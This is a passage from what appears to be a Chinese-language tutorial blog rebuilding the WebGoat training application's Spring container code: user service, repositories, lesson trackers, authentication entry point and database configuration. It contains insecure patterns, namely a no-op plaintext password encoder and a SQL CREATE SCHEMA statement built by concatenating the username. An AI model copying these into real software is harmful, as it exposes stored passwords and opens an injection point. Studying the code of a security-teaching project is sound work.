<span class="keyword">return</span> (NoOpPasswordEncoder) NoOpPasswordEncoder.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="users-1"><a href="#users-1" class="headerlink" title="users"></a>users</h2><h3 id="UserService"><a href="#UserService" class="headerlink" title="UserService"></a>UserService</h3><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220707161213187.png" alt="image-20220707161213187"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Initializeable;</span><br><span class="line"><span class="keyword">import</span> org.flywaydb.core.Flyway;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UsernameNotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Function;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="comment">//@Service注解用于类上，标记当前类是一个service类，加上该注解会将当前类自动注入到spring容器中，不需要再在applicationContext.xml文件定义bean了</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="comment">//生成构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> <span class="keyword">implements</span> <span class="title class_">UserDetailsService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserRepository userRepository;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserTrackerRepository userTrackerRepository;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JdbcTemplate jdbcTemplate;</span><br><span class="line">    <span class="comment">//                获取JdbcTemplat实例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Function&lt;String,Flyway&gt; flywayLessons;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Initializeable&gt; lessonInitializables;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> WebGoatUser <span class="title function_">loadUserByUsername</span><span class="params">(String username)</span> <span class="keyword">throws</span> UsernameNotFoundException&#123;</span><br><span class="line">        <span class="type">WebGoatUser</span> <span class="variable">webGoatUser</span> <span class="operator">=</span> userRepository.findByUsername(username);</span><br><span class="line"><span class="comment">//        根据用户名查找用户</span></span><br><span class="line">        <span class="keyword">if</span> (webGoatUser == <span class="literal">null</span> )&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UsernameNotFoundException</span>(<span class="string">&quot;User not found&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            webGoatUser.createUser();</span><br><span class="line">            lessonInitializables.forEach(l-&gt;l.initialize(webGoatUser));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> webGoatUser;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addUser</span><span class="params">(String username ,String password)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">userAlreadyExists</span> <span class="operator">=</span> userRepository.existsByUsername(username);</span><br><span class="line"><span class="comment">//        根据用户名查看是否存在用户</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">webGoatUser</span> <span class="operator">=</span> userRepository.save(<span class="keyword">new</span> <span class="title class_">WebGoatUser</span>(username,password));</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        <span class="keyword">if</span> (!userAlreadyExists)&#123;</span><br><span class="line">            userTrackerRepository.save(<span class="keyword">new</span> <span class="title class_">UserTracker</span>(username));</span><br><span class="line"><span class="comment">//            如果用户存在就不会在创建了</span></span><br><span class="line">            createLessonsForUser(webGoatUser);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">createLessonsForUser</span><span class="params">(WebGoatUser webGoatUser)</span>&#123;</span><br><span class="line">        jdbcTemplate.execute(<span class="string">&quot;CREATE SCHEMA \&quot;&quot;</span>+webGoatUser.getUsername()+<span class="string">&quot;\&quot; authorization dba&quot;</span>);</span><br><span class="line">        <span class="comment">//使用该实例的execute(String sql)方法执行 SQL语句创建一个以user用户名的数据库</span></span><br><span class="line">        flywayLessons.apply(webGoatUser.getUsername()).migrate();</span><br><span class="line"><span class="comment">//      进行迁移应用</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> List&lt;WebGoatUser&gt; <span class="title function_">getAllUsers</span><span class="params">()</span>&#123;<span class="keyword">return</span> userRepository.findAll();&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UserRepository"><a href="#UserRepository" class="headerlink" title="UserRepository"></a>UserRepository</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;WebGoatUser,String&gt; &#123;</span><br><span class="line">    WebGoatUser <span class="title function_">findByUsername</span><span class="params">(String username)</span>;</span><br><span class="line"><span class="comment">//    根据用户名去查找用户</span></span><br><span class="line">    List&lt;WebGoatUser&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">existsByUsername</span><span class="params">(String username)</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UserTrackerRepository"><a href="#UserTrackerRepository" class="headerlink" title="UserTrackerRepository"></a>UserTrackerRepository</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserTrackerRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;UserTracker,String&gt; &#123;</span><br><span class="line">    UserTracker <span class="title function_">findByUser</span><span class="params">(String user)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UserTracker"><a href="#UserTracker" class="headerlink" title="UserTracker"></a>UserTracker</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Assignment;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="comment">//启动日志</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="comment">//是指这个类映射到数据库中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserTracker</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line"><span class="comment">//    用于声明一个实体类的属性映射为数据库的主键列,该属性通常置于属性语句之前,可与声明语句同行,也可写在单独行上面</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span></span><br><span class="line"><span class="comment">//    公司开发使用Mysql数据库，生产使用Oracle数据库，当同时使用两种数据库时，JPA主键生成策略可以选择GenerationType.Auto来实现。</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="meta">@Column(name=&quot;username&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="meta">@OneToMany(cascade = CascadeType.ALL,fetch = FetchType.EAGER)</span></span><br><span class="line"><span class="comment">// @OneToMany 一对多关联映射   @Cascade：相当于set标签的cascade属性 fetch: 加载类型，有lazy和eager两种</span></span><br><span class="line">    <span class="keyword">private</span> Set&lt;LessonTracker&gt; lessonTrackers = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserTracker</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserTracker</span><span class="params">(<span class="keyword">final</span> String user)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> LessonTracker <span class="title function_">getLessonTracker</span><span class="params">(Lesson lesson)</span>&#123;</span><br><span class="line">        Optional&lt;LessonTracker&gt; lessonTracker  = lessonTrackers</span><br><span class="line">                .stream().filter(l-&gt;l.getLessonName().equals(lesson.getId())).findFirst();</span><br><span class="line">        <span class="keyword">if</span> (!lessonTracker.isPresent())&#123;</span><br><span class="line"><span class="comment">//            如果lessonTracker存在</span></span><br><span class="line">            <span class="type">LessonTracker</span> <span class="variable">newLessonTracker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LessonTracker</span>(lesson);</span><br><span class="line">            lessonTrackers.add(newLessonTracker);</span><br><span class="line">            <span class="keyword">return</span> newLessonTracker;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> lessonTracker.get();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Optional&lt;LessonTracker&gt; <span class="title function_">getLessonTracker</span><span class="params">(String id)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> lessonTrackers.stream().filter(l-&gt;l.getLessonName().equals(id)).findFirst();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">assignmentSolved</span><span class="params">(Lesson lesson,String assignmentName)</span>&#123;</span><br><span class="line">        <span class="type">LessonTracker</span> <span class="variable">lessonTracker</span> <span class="operator">=</span> getLessonTracker(lesson);</span><br><span class="line">        lessonTracker.incrementAttempts();</span><br><span class="line">        lessonTracker.assignmentSolved(assignmentName);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">assignmentFailed</span><span class="params">(Lesson lesson)</span>&#123;</span><br><span class="line">        LessonTracker lessonTracker= getLessonTracker(lesson);</span><br><span class="line">        lessonTracker.incrementAttempts();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reset</span><span class="params">(Lesson al)</span>&#123;</span><br><span class="line">        <span class="type">LessonTracker</span> <span class="variable">lessonTracker</span> <span class="operator">=</span> getLessonTracker(al);</span><br><span class="line">        lessonTracker.reset();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfLessonsSolved</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">numberOfLessonsSolved</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (LessonTracker lessonTracker:lessonTrackers)&#123;</span><br><span class="line">            <span class="keyword">if</span> (lessonTracker.isLessonSolved())&#123;</span><br><span class="line">                numberOfLessonsSolved = numberOfLessonsSolved+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> numberOfLessonsSolved;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfAssignmentsSolved</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">numberOfAssignmentsSolved</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (LessonTracker lessonTracker : lessonTrackers)&#123;</span><br><span class="line">            Map&lt;Assignment,Boolean&gt; lessonOverview = lessonTracker.getLessonOverview();</span><br><span class="line">            numberOfAssignmentsSolved = lessonOverview.values().stream().filter(b-&gt;b).collect(Collectors.counting()).intValue();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> numberOfAssignmentsSolved;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LessonTracker"><a href="#LessonTracker" class="headerlink" title="LessonTracker"></a>LessonTracker</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Assignment;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="comment">//映射到数据库</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonTracker</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line"><span class="comment">//      用于声明一个实体类的属性映射为数据库的主键列,该属性通常置于属性语句之前,可与声明语句同行,也可写在单独行上面</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> String lessonName;</span><br><span class="line">    <span class="meta">@OneToMany(cascade = CascadeType.ALL,fetch = FetchType.EAGER)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Assignment&gt; solvedAssignments = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="meta">@OneToMany(cascade = CascadeType.ALL,fetch = FetchType.EAGER)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Assignment&gt; allAssignments = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">numberOfAttempts</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="meta">@Version</span></span><br><span class="line">    <span class="keyword">private</span> Integer version;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">LessonTracker</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LessonTracker</span><span class="params">(Lesson lesson)</span>&#123;</span><br><span class="line">        lessonName = lesson.getId();</span><br><span class="line">        allAssignments.addAll(lesson.getAssignments() == <span class="literal">null</span> ? List.of() : lesson.getAssignments());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Optional&lt;Assignment&gt; <span class="title function_">getAssignment</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> allAssignments.stream().filter(a-&gt;a.getName().equals(name)).findFirst();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">assignmentSolved</span><span class="params">(String solvedAssignment)</span>&#123;</span><br><span class="line">        getAssignment(solvedAssignment).ifPresent(solvedAssignments::add);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isLessonSolved</span><span class="params">()</span>&#123;<span class="keyword">return</span> allAssignments.size() == solvedAssignments.size();&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">incrementAttempts</span><span class="params">()</span>&#123;</span><br><span class="line">        numberOfAttempts++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">reset</span><span class="params">()</span>&#123;solvedAssignments.clear();&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map&lt;Assignment,Boolean&gt; <span class="title function_">getLessonOverview</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;Assignment&gt; notSolved = allAssignments.stream()</span><br><span class="line">                .filter(i-&gt; !solvedAssignments.contains(i))</span><br><span class="line">                .toList();</span><br><span class="line">        Map&lt;Assignment,Boolean&gt; overview = notSolved.stream().collect(Collectors.toMap(a-&gt;a,b-&gt;<span class="literal">false</span>));</span><br><span class="line">        overview.putAll(solvedAssignments.stream().collect(Collectors.toMap(a-&gt;a,b-&gt;<span class="literal">true</span>)));</span><br><span class="line">        <span class="keyword">return</span> overview;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="AjaxAuthenticationEntryPoint"><a href="#AjaxAuthenticationEntryPoint" class="headerlink" title="AjaxAuthenticationEntryPoint"></a>AjaxAuthenticationEntryPoint</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.authentication.LoginUrlAuthenticationEntryPoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AjaxAuthenticationEntryPoint</span> <span class="keyword">extends</span> <span class="title class_">LoginUrlAuthenticationEntryPoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AjaxAuthenticationEntryPoint</span><span class="params">(String loginFormUrl)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(loginFormUrl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">commence</span><span class="params">(HttpServletRequest request, HttpServletResponse response, AuthenticationException authenticationException)</span> <span class="keyword">throws</span> IOException, ServletException&#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getHeader(<span class="string">&quot;x-requested-with&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//            x-requested-with 请求头 区分ajax请求还是普通请求 </span></span><br><span class="line">            response.sendError(<span class="number">401</span>,authenticationException.getMessage());</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.commence(request,response,authenticationException);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="lessons-2"><a href="#lessons-2" class="headerlink" title="lessons"></a>lessons</h2><h3 id="Initializeable"><a href="#Initializeable" class="headerlink" title="Initializeable"></a>Initializeable</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.lessons;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.WebGoatUser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Initializeable</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(WebGoatUser webGoatUser)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="DatabaseConfiguration"><a href="#DatabaseConfiguration" class="headerlink" title="DatabaseConfiguration"></a>DatabaseConfiguration</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.LessonScanner;</span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.flywaydb.core.Flyway;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.jdbc.DataSourceProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Primary;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.datasource.DriverManagerDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Function;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//这是一个配置类</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="comment">//@RequiredArgsConstructor(onConstructor =@_(@Autowired))</span></span><br><span class="line"><span class="comment">//写在类上可以代替@Autowired注解，需要注意的是在注入时需要用final定义，或者使用@notnull注解</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="comment">//使用日志</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DatabaseConfiguration</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DataSourceProperties properties;</span><br><span class="line"><span class="comment">//   用于读取配置信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonScanner lessonScanner;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line"><span class="comment">//    @Primary只是让系统知道如果存在多个相同类型的bean时，自动选择哪一个。</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">dataSource</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">DriverManagerDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DriverManagerDataSource</span>();</span><br><span class="line">        dataSource.setDriverClassName(properties.getDriverClassName());</span><br><span class="line"><span class="comment">//        获取驱动类</span></span><br><span class="line">        dataSource.setUrl(properties.getUrl());</span><br><span class="line"><span class="comment">//        获取路径信息</span></span><br><span class="line">        dataSource.setUsername(properties.getUsername());</span><br><span class="line"><span class="comment">//        获取username</span></span><br><span class="line">        dataSource.setPassword(properties.getPassword());</span><br><span class="line"><span class="comment">//        获取密码</span></span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean(initMethod = &quot;migrate&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Flyway <span class="title function_">flyWayContainer</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Flyway</span><br><span class="line">                .configure()</span><br><span class="line"><span class="comment">//                创建一个配置</span></span><br><span class="line">                .configuration(Map.of(<span class="string">&quot;driver&quot;</span>,properties.getDriverClassName()))</span><br><span class="line"><span class="comment">//          取出驱动放入配置中去</span></span><br><span class="line">                .dataSource(dataSource())</span><br><span class="line"><span class="comment">//                从上面的数据源放入flyway中</span></span><br><span class="line">                .schemas(<span class="string">&quot;container&quot;</span>)</span><br><span class="line"><span class="comment">//                设置管理模式</span></span><br><span class="line">                .locations(<span class="string">&quot;db/container&quot;</span>)</span><br><span class="line"><span class="comment">//                设置递归扫描迁移的位置为classpath:db/container</span></span><br><span class="line">                .load();</span><br><span class="line"><span class="comment">//              返回flyway对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Function&lt;String,Flyway&gt; <span class="title function_">flywayLessons</span><span class="params">(LessonDataSource lessonDataSource)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> schema -&gt; Flyway</span><br><span class="line">                .configure()</span><br><span class="line">                .configuration(Map.of(<span class="string">&quot;driver&quot;</span>,properties.getDriverClassName()))</span><br><span class="line">                .schemas(schema)</span><br><span class="line">                .dataSource(lessonDataSource)</span><br><span class="line">                .locations(<span class="string">&quot;lessons&quot;</span>)</span><br><span class="line">                .load();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> LessonDataSource <span class="title function_">lessonDataSource</span><span class="params">()</span>&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LessonDataSource</span>(dataSource());&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="LessonDataSource"><a href="#LessonDataSource" class="headerlink" title="LessonDataSource"></a>LessonDataSource</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.LessonConnectionInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.datasource.ConnectionProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> javax.xml.crypto.Data;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonDataSource</span> <span class="keyword">implements</span> <span class="title class_">DataSource</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DataSource originalDataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LessonDataSource</span><span class="params">(DataSource dataSource)</span>&#123;<span class="built_in">this</span>.originalDataSource = dataSource;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">targetConnection</span> <span class="operator">=</span> originalDataSource.getConnection();</span><br><span class="line"><span class="comment">//        获取与数据库的连接</span></span><br><span class="line">        <span class="keyword">return</span> (Connection) Proxy.newProxyInstance(</span><br><span class="line">                ConnectionProxy.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ConnectionProxy.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">LessonConnectionInvocationHandler</span>(targetConnection));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> originalDataSource.getConnection(username,password);</span><br><span class="line"><span class="comment">//        获取连接</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> originalDataSource.getLogWriter();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        originalDataSource.setLogWriter(out);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title 